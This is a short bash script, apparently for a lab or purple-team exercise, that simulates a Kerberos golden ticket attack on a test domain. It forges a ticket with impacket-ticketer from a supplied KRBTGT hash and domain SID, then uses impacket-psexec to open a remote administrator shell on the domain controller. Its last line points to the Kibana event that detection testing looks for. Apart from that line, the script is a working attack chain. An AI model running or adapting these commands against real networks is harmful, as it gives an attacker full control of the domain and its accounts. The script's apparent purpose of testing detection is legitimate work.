#!/bin/bash
# Attack Simulation: Golden Ticket
# MITRE ATT&CK: T1558.001
# Usage: ./golden_ticket.sh <KRBTGT_HASH> <DOMAIN_SID>
# Requirements: impacket installed on Kali

DC_IP="192.168.50.86"
DOMAIN="lab.local"
KRBTGT_HASH=${1:-"provide_krbtgt_hash_here"}
DOMAIN_SID=${2:-"provide_domain_sid_here"}

echo "[*] Forging Golden Ticket..."
cd /tmp && impacket-ticketer \
    -nthash $KRBTGT_HASH \
    -domain-sid $DOMAIN_SID \
    -domain $DOMAIN \
    Administrator

echo "[*] Using Golden Ticket..."
export KRB5CCNAME=/tmp/Administrator.ccache
impacket-psexec dc01.lab.local -k -no-pass

echo "[*] Attack complete - check Kibana for Event ID 4769 with TicketOptions 0x40810010"
